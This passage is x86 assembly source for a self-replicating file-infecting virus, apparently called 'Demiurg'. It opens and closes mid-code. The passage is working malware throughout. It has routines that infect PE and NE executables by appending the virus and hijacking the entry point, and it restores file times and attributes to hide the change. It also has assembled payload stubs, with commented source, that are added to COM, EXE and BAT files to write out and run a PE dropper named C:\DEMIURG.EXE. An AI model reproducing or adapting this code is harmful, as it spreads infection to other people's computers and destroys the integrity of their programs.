	pop word ptr [ebp+offset NE_start_IP]
	mov [eax+14h], cx                       ; set new one

	add [edx+2], bx                         ; fixup physical segment size
	add [edx+6], bx                         ; fixup virtual segment size

	movzx edi, word ptr [edx]               ; start of segment in file

	push ecx
	mov cl, [ebp+offset shift_value]
	shl edi, cl                             ; start of segment in bytes
	pop ecx

	add edi, ecx                            ; add size of segment
	mov esi, [ebp+offset filesize]
	mov ecx, esi
	sub ecx, edi                            ; length to move
	dec esi
	add esi, [ebp+offset mapbase]
	push edi                                ; save virus start

	add [ebp+offset filesize], ebx          ; fixup filesize

	mov edi, esi
	add edi, ebx
	std
	rep movsb

	pop edi
	push edi
	add edi, [ebp+offset mapbase]
	lea esi, [ebp+offset NE_virus_code]
	mov ecx, ebx
	cld
	rep movsb

	pop edx                                 ; EDX=virus start in file

	mov cl, [ebp+offset shift_value]
	shr ebx, cl                             ; EBX=virus size in alignment units

	movzx esi, word ptr [eax+22h]           ; start of segment table
	add esi, eax                            ; ESI=segment table in map
	movzx ecx, word ptr [eax+1Ch]           ; ECX=number of segments

segment_loop_head:
	movzx eax, word ptr [esi]               ; EAX=offset of resource
	db 0C1h, 0E0h                           ; shl eax, imm8
shift_value    db ?
	cmp eax, edx                            ; resource ofs > virus start?
	JL segment_ok
	add word ptr [esi], bx                  ; fix up resource offset
segment_ok:
	add esi, 8
	LOOP segment_loop_head


	mov esi, [ebp+offset resource_table]

resources_loop_head:
	cmp word ptr [esi], 0                   ; end of TypeInfo table?
	JE done_resources

	movzx ecx, word ptr [esi+2]             ; Resource count
	lea edi, [esi+8]                        ; NameInfo Array

NameInfo_loop_head:
	movzx eax, word ptr [edi]               ; EAX=offset of resource
	db 0C1h, 0E0h                           ; shl eax, imm8
shift_value2    db ?

	cmp eax, edx                            ; resource ofs > virus start?
	JL resource_ok
	add word ptr [edi], bx                  ; fix up resource offset
resource_ok:
	add edi, 12
	LOOP NameInfo_loop_head

	mov esi, edi
	JMP resources_loop_head
done_resources:

	mov edi, [ebp + offset mapbase]
	add edi, [ebp + offset filesize]
	call create_dropper
	add dword ptr [ebp + offset filesize], dropper_size

	JMP abort_infection


; ----- INFECT A PE EXE FILE ------------------------------------------------

infect_PE:
	push ebx                                ; save PE header pointer

	call append_PE                          ; modify last sect. for virus

	mov ebx, [ebp+offset virus_RVA]         ; EBX=RVA of virus in victim
	xchg ebx, [eax+28h]                     ; set as new entrypoint, save
						; old entryRVA in EBX
	mov ecx, [eax+34h]                      ; ECX=imagebase
	mov [ebp+offset imagebase], ecx         ; save it
	add ebx, ecx                            ; EBX=entry VA
	mov [ebp+orig_eip], ebx                 ; save it

	pop ebx                                 ; EBX=PE header pointer

	call finish_PE_infection                ; append virus, recalc CRC

already_infected:
abort_infection:
	call closemap                           ; close filemap and file
quit_infect_error:
	RET

; ----- END INFECT FILE -----------------------------------------------------










openfile:
	mov [ebp+offset filename_ofs], edx

	push edx                                ; offset filename
	call [ebp+offset GetFileAttributesA]
	mov [ebp+attributes], eax
	inc eax
	JNZ get_attribs_ok

	stc
	ret

get_attribs_ok:
	push 80h                                ; normal attributes
	push dword ptr [ebp+offset filename_ofs]
	call [ebp+offset SetFileAttributesA]
	or eax, eax
	JNZ kill_attribs_ok

	stc
	ret

kill_attribs_ok:
	push 0                                  ; template file (shit)
	push 80h                                ; file attributes (normal)
	push 3                                  ; open existing
	push 0                                  ; security attributes (shit)
	push 0                                  ; do not share file
	push 0C0000000h                         ; read/write mode
	push dword ptr [ebp+offset filename_ofs] ; pointer to filename
	call [ebp+offset CreateFileA]
	mov [ebp+filehandle], eax
	inc eax                                 ; EAX= -1 (Invalid handle val)
	JNZ open_ok

	stc
	ret

open_ok:
	lea eax, [ebp+offset LastWriteTime]
	push eax
	sub eax, 8
	push eax
	sub eax, 8
	push eax
	push dword ptr [ebp+offset filehandle]
	call [ebp+offset GetFileTime]
	or eax, eax
	JNZ get_time_ok

	call closefile
	stc
	ret

get_time_ok:
	push 0                                  ; high filesize dword ptr
	push dword ptr [ebp+offset filehandle]
	call [ebp+offset GetFileSize]
	mov [ebp+offset filesize], eax
	inc eax
	JNZ get_filesize_ok

	call closefile
	stc
	ret

get_filesize_ok:
	add eax, workspace-1
	JMP mapfile



createfile:
	mov [ebp+offset filename_ofs], edx

	push 0                                  ; template file (shit)
	push 80h                                ; file attributes (normal)
	push 1                                  ; create new file (failure if
						; old one exists)
	push 0                                  ; security attributes (shit)
	push 0                                  ; do not share file
	push 0C0000000h                         ; read/write mode
	push edx                                ; pointer to filename
	call [ebp+offset CreateFileA]
	mov [ebp+offset filehandle], eax
	inc eax                                 ; EAX= -1 (Invalid handle val)
	JNZ createfile_ok

	stc
	RET
createfile_ok:
	mov dword ptr [ebp+offset attributes], 80h

	lea edi, [ebp+offset CreationTime]
	xor eax, eax
	mov ecx, 6
	rep stosw

	mov [ebp+offset filesize], ecx          ; filesize=0
	mov eax, workspace






mapfile:
	push 0                                  ; name file mapping obj (shit)
	push eax                                ; low dword of filesize
	push 0                                  ; high dword of filesize
	push 4                                  ; PAGE_READWRITE
	push 0                                  ; security attributes (shit)
	push dword ptr [ebp+offset filehandle]
	call [ebp+offset CreateFileMappingA]
	mov [ebp+offset maphandle], eax
	or eax, eax                             ; close?
	JNZ createfilemapping_ok

	call closefile
	stc
	RET

createfilemapping_ok:
	push 0                                  ; map the whole file
	push 0                                  ; low dword of fileoffset
	push 0                                  ; high dword of fileoffset
	push 2                                  ; read/write access
	push dword ptr [ebp+offset maphandle]
	call [ebp+offset MapViewOfFile]
	mov [ebp+offset mapbase], eax
	or eax, eax
	JNZ mapfile_ok

	call closemaphandle
	stc
	RET

mapfile_ok:
	push eax
	xchg edi, eax
	add edi, [ebp+offset filesize]
	xor eax, eax
	mov ecx, workspace
	rep stosb

	pop eax
	clc
	RET





closemap:
	push dword ptr [ebp+offset mapbase]
	call [ebp+offset UnmapViewOfFile]

closemaphandle:
	push dword ptr [ebp+offset maphandle]
	call [ebp+offset CloseHandle]

	push 0                                  ; move relative to start of file
	push 0                                  ; high word pointer of file offset
	push dword ptr [ebp+offset filesize]
	push dword ptr [ebp+offset filehandle]
	call [ebp+offset SetFilePointer]

	push dword ptr [ebp+offset filehandle]
	call [ebp+offset SetEndOfFile]

closefile:
	lea eax, [ebp+offset LastWriteTime]
	push eax
	sub eax, 8
	push eax
	sub eax, 8
	push eax
	push dword ptr [ebp+offset filehandle]
	call [ebp+offset SetFileTime]

	push dword ptr [ebp+offset filehandle]
	call [ebp+offset CloseHandle]

	push dword ptr [ebp+offset attributes]
	push dword ptr [ebp+offset filename_ofs]
	call [ebp+offset SetFileAttributesA]

	RET


; ----- MODIFY PE FILE LAST SECTION/IMAGESIZE FOR INFECTION -----------------

append_PE:
	movzx ecx, word ptr [ebx+6]             ; ECX=number of sections
	dec ecx                                 ; ECX=number of last section

	push ebx                                ; save PE header offset

	movzx edx, word ptr [ebx+14h]           ; EDX=size of optional header
	add ebx, edx                            ; add size of optional header
	add ebx, 18h                            ; add size of file header
						; EBX=first section header

	xor edx, edx                            ; EDX=0
	mov eax, 40                             ; EAX=size of one sect.header
	mul ecx                                 ; EAX=size of n-1 sect.headers
	add ebx, eax                            ; EBX=last sect.header pointer

	pop eax                                 ; EAX=PE header pointer

	or dword ptr [ebx+24h], 0E0000020h      ; modify last section flags:
						; read, write, exec, code
	
	mov ecx, [ebx+8h]                       ; ECX=VirtualSize of last sect

	or ecx, ecx                             ; VirtualSize=0 ?
	JNZ VirtualSize_OK                      ; if not, it's ok
	mov ecx, [ebx+10h]                      ; if yes, it means that
						; VirtualSize=SizeOfRawData
VirtualSize_OK:
	mov edx, ecx                            ; EDX=last sect. VirtualSize
	add edx, [ebx+14h]                      ; add PointerToRawData
	add edx, [ebp+mapbase]                  ; add start of memmap
	mov [ebp+offset virus_start], edx       ; save start of virus in map
	mov edx, ecx                            ; EDX=VirtualSize
	add edx, [ebx+0Ch]                      ; add VirtualAddress
	mov [ebp+offset virus_RVA], edx         ; save virus RVA
	add ecx, virus_size                     ; ECX=new section size
	push ecx                                ; save it
	mov [ebx+8h], ecx                       ; set it as new VirtualSize
	mov edx, [eax+3Ch]                      ; EDX=filealign
	call align_ECX                          ; align physical sect. size
	mov [ebx+10h], ecx                      ; save it as new SizeOfRawData
	add ecx, [ebx+14h]                      ; add PointerToRawData
	mov [ebp+filesize], ecx                 ; save it as new file size
	pop ecx                                 ; ECX=new section size
	add ecx, [ebx+0Ch]                      ; ECX=new imagesize
	mov edx, [eax+38h]                      ; EDX=SectionAlign
	call align_ECX                          ; align the new imagesize
	mov [eax+50h], ecx                      ; set it as new image size

	RET


; ----- MOVE VIRUS BODY AND RECALCULATE CHECKSUM ----------------------------

finish_PE_infection:

	lea esi, [ebp+start]                    ; ESI=start of virus body
	mov edi, [ebp+virus_start]              ; EDI=virus place in victim
	mov ecx, virus_size                     ; ECX=size of virus
	rep movsb                               ; copy virusbody to filemap

	add ebx, 58h                            ; EBX=PE checksum in map
	cmp dword ptr [ebx], 0                  ; checksummed file?
	JE end_finish_PE_infection              ; if not, we are done

	lea eax, [ebp+offset imagehlp_dll]      ; EAX=ptr to "IMAGEHLP.DLL"
	push eax
	call [ebp+offset LoadLibraryA]          ; load IMAGEHLP.DLL
	or eax, eax                             ; EAX=0 means we failed
	JZ end_finish_PE_infection

	push ebx                                ; save pointer to old CRC

	lea esi, [ebp+offset CheckSumMappedFile] ; get the CheckSumMappedFile
	call My_GetProcAddress                  ; API
	
	pop ebx                                 ; restore pointer to old CRC
	JC end_finish_PE_infection

	mov ecx, [edx+eax]                      ; ECX=API RVA
	add eax, ecx                            ; ECX=API VA

	push ebx                                ; old CRC pointer
	lea ebx, [ebp+dummy_dword]
	push ebx                                ; place to store old CRC
	push dword ptr [ebp+filesize]           ; size of file
	push dword ptr [ebp+mapbase]            ; mapbase
	call eax                                ; call CheckSumMappedFile

end_finish_PE_infection:
	RET


; ----- GetAPIs -------------------------------------------------------------
; EAX=Module Base Address
; ECX=Number of APIs
; ESI=pointer to names table
; EDI=pointer to addresses table

GetAPIs:
get_APIs_loop:
	push ecx                                ; save number of APIs
	push eax                                ; save module base address
	push edi                                ; save pointer to address tbl

	call My_GetProcAddress                  ; get RVA of RVA of one API
	
	pop edi                                 ; EDI=where to store the RVAs
	mov ecx, [edx+eax]                      ; ECX=API RVA
	add eax, ecx                            ; EAX=API VA
	stosd                                   ; store the API VA

next_API_loop:
	inc esi                                 ; go to next byte
	cmp byte ptr [esi], 0                   ; reached end of API name?
	JNE next_API_loop                       ; if not, search on
	inc esi                                 ; ESI=next API name

	pop eax                                 ; EAX=module base address
	pop ecx                                 ; ECX=number of APIs left
	LOOP get_APIs_loop                      ; get the next API

	RET


; ----- My_GetProcAddress ---------------------------------------------------
; input:
; EAX=module base address
; ESI=API function name
; output:
; EDX=RVA of RVA of API function

My_GetProcAddress:
	mov ebx, eax                            ; EBX=module base address
	add ebx, [eax+3Ch]                      ; EBX=new exe header
	mov ebx, [ebx+78h]                      ; EBX=export directory RVA
	add ebx, eax                            ; EBX=export directory VA
	xor ecx, ecx                            ; ECX=0 (counter)
	mov edx, [ebx+18h]                      ; EDX=NumberOfNames
	mov edi, [ebx+20h]                      ; EDI=AddressOfNames array RVA
	add edi, eax                            ; EDI=AddressOfNames array VA

search_loop:
	pusha                                   ; save all registers
	mov edi, [edi+ecx*4]                    ; EDI=RVA of current API name
	add edi, eax                            ; EDI=VA of current API name

cmp_loop:
	lodsb                                   ; get a byte from our API name
	cmp byte ptr [edi], al                  ; is this byte equal?
	JNE search_on_API                       ; if not, this isn't our API
	inc edi                                 ; compare next byte
	or al, al                               ; reached end of API name ?
	JNE cmp_loop                            ; if not, go on with compare
	JMP found_API                           ; if yes, we found our API!

search_on_API:
	popa                                    ; restore all registers
	inc ecx                                 ; try the next exported API
	cmp ecx, edx                            ; end of exported APIs?
	JL search_loop                          ; if yes, try the next one

API_not_found:
	popa                                    ; restore all regisers
	stc                                     ; indicate error with carry
	RET

found_API:
	popa                                    ; restore all registers
	mov edx, [ebx+24h]                      ; EDX=AddressOfOrdinals RVA
	add edx, eax                            ; EDX=AddressOfOrdinals VA
	movzx ecx, word ptr [edx+ecx*2]         ; ECX=our API's ordinal
	mov edx, [ebx+1Ch]                      ; EDX=AddressOfFunctions RVA
	lea edx, [edx+ecx*4]                    ; EDX=RVA of RVA of API
	clc                                     ; successful, clear carry
	RET


; ----- aligns ECX to EDX ---------------------------------------------------
align_ECX:
	push ebx                                ; save EBX
	xchg eax, ecx                           ; EAX=value to be aligned
	mov ebx, edx                            ; EBX=alignment factor
	xor edx, edx                            ; zero out high dword
	div ebx                                 ; divide
	or edx, edx                             ; remainer zero?
	JZ no_round_up                          ; if so, don't round up
	inc eax                                 ; round up
no_round_up:
	mul ebx                                 ; multiply again
	xchg eax, ecx                           ; ECX=aligned value
	mov edx, ebx                            ; EDX=alignment factor
	pop ebx                                 ; restore EBX
	RET


; ----- DECOMPRESS ----------------------------------------------------------
; ESI : Source buffer offset
; EDI : Destination buffer offset
; EBX : size compressed data

decompress:
	add ebx, esi                            ; EBX=pointer to end of
						; compressed data
	cld                                     ; clear direction flag

loop_head:
	lodsb                                   ; get a byte from compr. data
	cmp al, 'æ'                             ; is it our special byte?
	JNE store                               ; if not, just treat it normal
	xor eax, eax                            ; EAX=0
	lodsb                                   ; EAX=number of repetitions
	xchg eax, ecx                           ; ECX=number of repetitions
	lodsb                                   ; AL=byte to store repetively
	rep stosb                               ; store the byte repetively
	JMP go_on                               ; go on with the next byte
store:
	stosb                                   ; simply store the byte
go_on:
	cmp ebx, esi                            ; reached the end?
	JA loop_head                            ; if not, just decompress on

	RET


; ----- CREATES THE PE DROPPER ----------------------------------------------
; input:
; EDI-where to put the dropper

create_dropper:
	pusha                                   ; save all registers

	mov dword ptr [ebp+orig_eip], 401060h   ; set EntryRVA for dummy PE
        mov dword ptr [ebp+imagebase], 400000h  ; set ImageBase for dummy PE

	mov ebx, dummy_PE_size                  ; EBX=size of dummy PE file
	lea esi, [ebp+offset dummy_PE]          ; ESI=pointer to compressed
						; PE file dropper
	call decompress                         ; decompress it

	lea esi, [ebp+start]                    ; ESI=start of virus body
	mov ecx, virus_size                     ; ECX=size of virus body
	cld                                     ; clear direction flag
	rep movsb                               ; copy virus body

	popa                                    ; restore all registers
	RET


; ----- compressed new header for COM->EXE conversion -----------------------
new_mz_header:
	db 04Dh, 05Ah, 0E6h, 006h, 000h, 002h, 000h, 001h
	db 000h, 0FFh, 0FFh, 0F0h, 0FFh, 0FEh, 0FFh, 000h
	db 000h, 000h, 001h, 0F0h, 0FFh, 0E6h, 008h, 000h

new_mz_header_size      EQU ($ - new_mz_header)


; ----- code that will be added to dos exe/com files ------------------------
;
; .286
; .model tiny
; .code
; org 100h
; start:
;         pusha                           ; save all registers
;         push ds                         ; save segment registers
;         push es
;
;         call next                       ; get delta offset
; next:
;         pop bp
;         sub bp, offset next
;
;         mov ax, ds                      ; AX=PSP segment
;         dec ax                          ; AX=MCB segment
;         mov ds, ax                      ; DS=MCB segment
;         mov bx, ds:[3]                  ; BX=MCB size (in paragraphs)
;         sub bx, 0E00h                   ; shrink MCB for 0E00h bytes
;
;         mov ah, 4Ah                     ; resize MCB in ES to BX paragraphs
;         int 21h                         ; we need to free RAM if we want to
;                                         ; execute another program, even if
;                                         ; it is for Windows
;
;         push cs                         ; DS=CS
;         pop ds
;
;         mov ax, es                      ; AX=ES=PSP segment
;         mov [bp+offset segm], ax        ; save in data block
;
;         push cs                         ; ES=CS
;         pop es
;
;         mov ah, 3Ch                     ; create file
;         xor cx, cx                      ; CX=0 (attribtes for new file)
;         lea dx, [bp+offset filename]    ; DS:DX=pointer to filename
;         int 21h
;
;         xchg bx, ax                     ; handle to BX
;
;         mov ah, 40h                     ; write to file
;         mov cx, dropper_size            ; write the whole dropper
;         lea dx, [bp+offset dropper]     ; DS:DX=pointer to write buffer
;         int 21h
;
;         mov ah, 3Eh                     ; close file
;         int 21h
;
; execute:
;         mov ax, 4B00h                   ; execute file
;         lea bx, [bp+offset parameter]   ; ES:BX=pointer to parameter block
;         lea dx, [bp+offset filename]    ; DS:DX=pointer to filename
;         int 21h
;
;         pop es                          ; restore segment registers
;         pop ds
;
;         mov ax, es                      ; AX=PSP segment
;         add ax, 10h                     ; AX=start segment of program image
;         add [bp+relo_CS], ax            ; relocate old segment values
;         add [bp+relo_SS], ax
;
;         popa                            ; restore all registers
;
;         db 68h                          ; push imm16
; relo_SS dw ?
;
;         cli
;         pop ss                          ; set host SS
;         db 0BCh                         ; mov sp, imm16
; SP_start dw ?
;         sti
;
;         db 0EAh                         ; jmp far imm32
; IP_start dw ?
; relo_CS  dw ?
;
;
; filename db "C:\DEMIURG.EXE", 0
;
; parameter:
;            dw 0                         ; same enviroment as caller
;            dw 80h
; segm       dw 0
;            dw 4 dup(0FFFFh)             ; FCB addresses (nothing)
;
; dropper:
;
; end start

dos_virus_code:
	db 060h, 01Eh, 006h, 0E8h, 000h, 000h, 05Dh, 081h
	db 0EDh, 006h, 001h, 08Ch, 0D8h, 048h, 08Eh, 0D8h
        db 08Bh, 01Eh, 003h, 000h, 081h, 0EBh, 000h, 00Eh
	db 0B4h, 04Ah, 0CDh, 021h, 00Eh, 01Fh, 08Ch, 0C0h
	db 089h, 086h, 07Eh, 001h, 00Eh, 007h, 0B4h, 03Ch
	db 033h, 0C9h, 08Dh, 096h, 06Bh, 001h, 0CDh, 021h
	db 093h, 0B4h, 040h, 0B9h
        dw dropper_size
        db 08Dh, 096h
	db 088h, 001h, 0CDh, 021h, 0B4h, 03Eh, 0CDh, 021h
	db 0B8h, 000h, 04Bh, 08Dh, 09Eh, 07Ah, 001h, 08Dh
	db 096h, 06Bh, 001h, 0CDh, 021h, 007h, 01Fh, 08Ch
	db 0C0h, 005h, 010h, 000h, 001h, 086h, 069h, 001h
	db 001h, 086h, 05Eh, 001h, 061h, 068h
relo_SS dw ?
        db 0FAh, 017h, 0BCh
SP_start dw ?
        db 0FBh, 0EAh
IP_start dw ?
relo_CS dw ?
        db 043h, 03Ah, 05Ch, 044h, 045h
	db 04Dh, 049h, 055h, 052h, 047h, 02Eh, 045h, 058h
	db 045h, 000h, 000h, 000h, 080h, 000h, 000h, 000h
	db 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh
size_dos_virus_code     EQU ($ - dos_virus_code)


; ----- code that will be added to BAT files --------------------------------
;
; This is the BAT code that is appended at the end of infected BAT files. As
; you see, it ECHOes out a COM file and executes it. Then the COM file reads
; the PE dropper that is stored as a kind of internal overlay at the end of
; the BAT file, writes it to disk and executes it. Here is the ASM source of
; the COM loader first:
;
; .286
; .model tiny
; .code
; org 100h
; start:
;         mov ah, 4Ah                     ; resize memory block
;         mov bx, 2020h                   ; BX=new MCB size in paragraphs
;         int 21h
;
;         xor bx, bx                      ; BX=0
;         mov bl, 80h                     ; BX=80h (command line in PSP)
;         mov si, bx                      ; SI=BX
;         mov bl, [si]                    ; BX=length of commandline
;         mov [si+bx+1], bh               ; make command line zero terminated
;
;         mov ax, 3D02h                   ; open file read/write
;         lea dx, [si+2]                  ; DS:DX=pointer to filename(cmdline)
;         int 21h
;         JNC file_ok
;         RET                             ; quit com file
;
; file_ok:
;         xchg bx, ax                     ; handle to BX
;
;         mov ax, 4202h                   ; set filepointer relative to EOF
;         xor cx, cx                      ; CX=0
;         dec cx                          ; CX=-1
;         mov dx, ((-dropper_size)-1)     ; otherwise we would have a zerobyte
;                                         ; in the COM file
;         inc dx                          ; CX:DX=-dropper_size
;         int 21h
; 
;         mov ah, 3Fh                     ; read from file
;         mov cx, dropper_size - 1        ; read the whole PE dropper
;         inc cx
;         mov dx, offset buffer           ; DS:DX=offset to read buffer
;         int 21h
;
;         mov ah, not 3Eh                 ; close file
;         not ax
;         int 21h
;
;         mov ah, not 3Ch                 ; create file
;         not ax
;         xor cx, cx                      ; CX=0 (file attributes)
;         mov zero, cl                    ; make filename zero terminated
;         mov dx, offset exefile          ; DS:DX=pointer to filename
;         int 21h
;         JC quit
;
;         xchg bx, ax                     ; handle to BX
;
;         mov ah, 40h                     ; write to file
;         mov cx, dropper_size - 1        ; CX=size to write (whole PE drpper)
;         inc cx
;         mov dx, offset buffer           ; DS:DX=pointer to write buffer
;         int 21h
;         JC quit
;
;         mov ah, not 3Eh                 ; close file
;         not ax
;         int 21h
;
;         xor ax, ax                      ; AX=0
;         mov ah, 4Bh                     ; AX=4B00h
;         xor bx, bx                      ; BX=0 (no parameter block)
;         mov dx, offset exefile          ; DS:DX=pointer to filename
;         int 21h
;
; quit:
;         mov ah, 4Ch                     ; quit program
;         int 21h
;
; exefile db "C:\demiurg.exe"
; zero    db ?
; buffer:
;
; end start

bat_virus_code:
	db "@echo off", 0Dh, 0Ah
	db "set overlay=%0", 0Dh, 0Ah
	db "if not exist %overlay% set overlay=%0.BAT", 0Dh, 0Ah
	db "echo "

	db 0B4h, 04Ah, 0BBh, 020h, 020h, 0CDh, 021h, 033h
	db 0DBh, 0B3h, 080h, 08Bh, 0F3h, 08Ah, 01Ch, 088h
	db 078h, 001h, 0B8h, 002h, 03Dh, 08Dh, 054h, 002h
	db 0CDh, 021h, 073h, 001h, 0C3h, 093h, 0B8h, 002h
	db 042h, 033h, 0C9h, 049h, 0BAh
        dw ((-dropper_size) - 1)
	db 042h, 0CDh, 021h, 0B4h, 03Fh, 0B9h
	dw (dropper_size - 1)
	db 041h
	db 0BAh, 07Eh, 001h, 0CDh, 021h, 0B4h, 0C1h, 0F7h
	db 0D0h, 0CDh, 021h, 0B4h, 0C3h, 0F7h, 0D0h, 033h
	db 0C9h, 088h, 00Eh, 07Dh, 001h, 0BAh, 06Fh, 001h
	db 0CDh, 021h, 072h, 01Fh, 093h, 0B4h, 040h, 0B9h
	dw (dropper_size - 1)
	db 041h, 0BAh, 07Eh, 001h, 0CDh, 021h, 072h, 011h
	db 0B4h, 0C1h, 0F7h, 0D0h, 0CDh, 021h, 033h, 0C0h
	db 0B4h, 04Bh, 033h, 0DBh, 0BAh, 06Fh, 001h, 0CDh
	db 021h, 0B4h, 04Ch, 0CDh, 021h, 043h, 03Ah, 05Ch
	db 064h, 065h, 06Dh, 069h, 075h, 072h, 067h, 02Eh
	db 065h, 078h, 065h

	db ">C:\DEMIURG.EXE"
	db 0Dh, 0Ah
	db "C:\DEMIURG.EXE %overlay%", 0Dh, 0Ah
	db "set overlay=", 0Dh, 0Ah
	db 1Ah                                  ; end of text file

size_bat_virus_code     EQU ($ - bat_virus_code)


; ------ Code that will be added to NE files --------------------------------
;
; .286
; .model tiny
; .code
; org 100h
; start:
;         pusha                                   ; save all registers
;         push ds                                 ; save segment registers
;         push es
;
;         call next                               ; get delta offset
; next:
;         pop si
;         add si, (data_block - next)
;
;         mov ax, es                              ; AX=PSP segment
;
;         push cs                                 ; DS=CS
;         pop ds
;
;         push ss                                 ; ES=SS
;         pop es
;         cld                                     ; clear direction flag
;         mov cx, data_size                       ; CX=size of our data
;         sub sp, (data_size+512)                 ; allocate buffer on stack
;         mov bp, sp                              ; BP=stack frame
;         mov di, bp                              ; DI=our buffer on stack
;         rep movsb                               ; copy data block to stackbuf
;
;         push ss                                 ; DS=ES=SS
;         push ss
;         pop es
;         pop ds
;
;         mov [bp+4], ax                          ; set PSP segm in paramblock
;
;         mov ax, 3D02h                           ; open file read/write
;         lea dx, [bp+our_filename-data_block]    ; DS:DX=filename of our host
;         int 21h
;         JC exit
;
;         xchg bx, ax                             ; handle to BX
;
;         mov ax, 4202h                           ; set filepointer relative
;                                                 ; to the end of the file
;         mov cx, -1                              ; CX:DX=-dropper_size
;         mov dx, -dropper_size
;         int 21h
;
;         mov [bp+source_handle-data_block], bx   ; save filehandle
;
;         mov ah, 3Ch                             ; create file
;         xor cx, cx                              ; CX=0 (file attributes)
;         lea dx, [bp+(filename-data_block)]      ; DS:DX=pointer to PE dropper
;                                                 ; filename ("C:\demiurg.exe")
;         int 21h
;         JC close_source
;
;         mov [bp+dest_handle-data_block], ax     ; save filehandle
;
;         mov cx, (dropper_size / 512)            ; CX=size of dropper in
;                                                 ; 512 byte blocks
;
; rw_loop:
;         push cx                                 ; save number of blocks left
;
;         mov ah, 3Fh                             ; read from file
;         mov bx, [bp+source_handle-data_block]   ; BX=source handle
;         mov cx, 512                             ; CX=size to read
;         lea dx, [bp+(buffer-data_block)]        ; DS:DX=pointer to read buf
;         int 21h
;
;         mov ah, 40h                             ; write to file
;         mov bx, [bp+dest_handle-data_block]     ; BX=destination handle
;         mov cx, 512                             ; CX=size to write
;         lea dx, [bp+(buffer-data_block)]        ; DS:DX=pointer to write buf
;         int 21h
;
;         pop cx                                  ; CX=number of blocks left
;         LOOP rw_loop
;
;         mov ah, 3Eh                             ; close source file
;         mov bx, [bp+source_handle-data_block]
;         int 21h
;
;         mov ah, 3Eh                             ; close destination file
;         mov bx, [bp+dest_handle-data_block]
;         int 21h
;
;         mov ax, 4B00h                           ; execute dropper file
;         mov bx, bp                              ; ES:BX=parameter block
;         lea dx, [bx+18]                         ; DS:DX=filename
;         int 21h
;
;         JMP exit
;
; close_source:
;         mov ah, 3Eh                             ; close file
;         mov bx, [bp+source_handle-data_block]
;         int 21h
;
; exit:
;         add sp, (data_size+512)                 ; remove stack buffer
;
;         pop es                                  ; restore segment registers
;         pop ds
;         popa                                    ; restore all registers
;
;         db 68h                                  ; push imm16
; NE_ip   dw 0
;         db 0C3h                                 ; ret near
;
; data_block      dw 0                            ; same enviroment as caller
;                 dw 80h                          ; parameter string offset
; segm            dw 0
;                 dw 4 dup(0)
;
; source_handle   dw 0
; dest_handle     dw 0
; filename        db "C:\DEMIURG.EXE", 0
; our_filename    db 13 dup(0)
; data_size = $ - data_block
; buffer:
;
; end start

NE_virus_code:
	db 060h, 01Eh, 006h, 0E8h, 000h, 000h, 05Eh, 081h
	db 0C6h, 094h, 000h, 08Ch, 0C0h, 00Eh, 01Fh, 016h
	db 007h, 0FCh, 0B9h, 02Eh, 000h, 081h, 0ECh, 02Eh
	db 002h, 08Bh, 0ECh, 08Bh, 0FDh, 0F3h, 0A4h, 016h
	db 016h, 007h, 01Fh, 089h, 046h, 004h, 0B8h, 002h
	db 03Dh, 08Dh, 056h, 021h, 0CDh, 021h, 072h, 05Fh
	db 093h, 0B8h, 002h, 042h, 0B9h, 0FFh, 0FFh, 0BAh
        dw -dropper_size
        db 0CDh, 021h, 089h, 05Eh, 00Eh, 0B4h
	db 03Ch, 033h, 0C9h, 08Dh, 056h, 012h, 0CDh, 021h
        db 072h, 03Eh, 089h, 046h, 010h, 0B9h
        dw (dropper_size/512)
	db 051h, 0B4h, 03Fh, 08Bh, 05Eh, 00Eh, 0B9h, 000h
	db 002h, 08Dh, 056h, 02Eh, 0CDh, 021h, 0B4h, 040h
	db 08Bh, 05Eh, 010h, 0B9h, 000h, 002h, 08Dh, 056h
	db 02Eh, 0CDh, 021h, 059h, 0E2h, 0E2h, 0B4h, 03Eh
	db 08Bh, 05Eh, 00Eh, 0CDh, 021h, 0B4h, 03Eh, 08Bh
	db 05Eh, 010h, 0CDh, 021h, 0B8h, 000h, 04Bh, 08Bh
	db 0DDh, 08Dh, 057h, 012h, 0CDh, 021h, 0EBh, 007h
	db 0B4h, 03Eh, 08Bh, 05Eh, 00Eh, 0CDh, 021h, 081h
        db 0C4h, 02Eh, 002h, 007h, 01Fh, 061h, 068h
NE_start_IP dw 0
        db 0C3h, 000h, 000h, 080h, 000h, 000h, 000h
	db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
	db 000h, 000h, 000h, 000h, 043h, 03Ah, 05Ch, 044h
	db 045h, 04Dh, 049h, 055h, 052h, 047h, 02Eh, 045h
	db 058h, 045h, 000h
our_filename db 13 dup(0)
size_NE_virus_code      EQU ($ - NE_virus_code)


; ------ dropper code -------------------------------------------------------
;
; This is a dummy PE file that is as small as possible (under 1KB) and just
; calls ExitProcess. It has been infected with the virus, then the virus body
; was removed, then compressed and converted to DB instructions. This means
; that all we have to do to recreate a working dropper is to expand it and
; add the virus body (see procedure create_dropper)

dummy_PE:
	db 04Dh, 05Ah, 040h, 000h, 001h, 000h, 000h, 000h
	db 004h, 000h, 000h, 000h, 001h, 0E6h, 005h, 000h
	db 042h, 04Ah, 000h, 000h, 0F0h, 0FFh, 040h, 0E6h
	db 023h, 000h, 040h, 000h, 000h, 000h, 050h, 045h
	db 000h, 000h, 04Ch, 001h, 001h, 0E6h, 00Dh, 000h
	db 0E0h, 000h, 08Eh, 081h, 00Bh, 001h, 0E6h, 00Eh
	db 000h, 068h, 010h, 0E6h, 00Ch, 000h, 040h, 000h
	db 000h, 010h, 000h, 000h, 000h, 002h, 000h, 000h
	db 001h, 0E6h, 007h, 000h, 003h, 000h, 00Ah, 0E6h
	db 006h, 000h, 060h, 000h, 000h, 000h, 002h, 0E6h
	db 006h, 000h, 002h, 0E6h, 005h, 000h, 010h, 000h
	db 000h, 020h, 0E6h, 004h, 000h, 010h, 000h, 000h
	db 010h, 0E6h, 006h, 000h, 010h, 0E6h, 00Ch, 000h
	db 010h, 000h, 000h, 054h, 0E6h, 073h, 000h, 02Eh
	db 064h, 065h, 06Dh, 069h, 075h, 072h, 067h, 000h
	db 050h, 000h, 000h, 000h, 010h, 000h, 000h, 000h
	db 042h, 000h, 000h, 000h, 002h, 0E6h, 00Eh, 000h
	db 060h, 000h, 000h, 0E0h, 0E6h, 0A0h, 000h, 028h
	db 010h, 0E6h, 00Ah, 000h, 038h, 010h, 000h, 000h
	db 030h, 010h, 0E6h, 016h, 000h, 046h, 010h, 0E6h
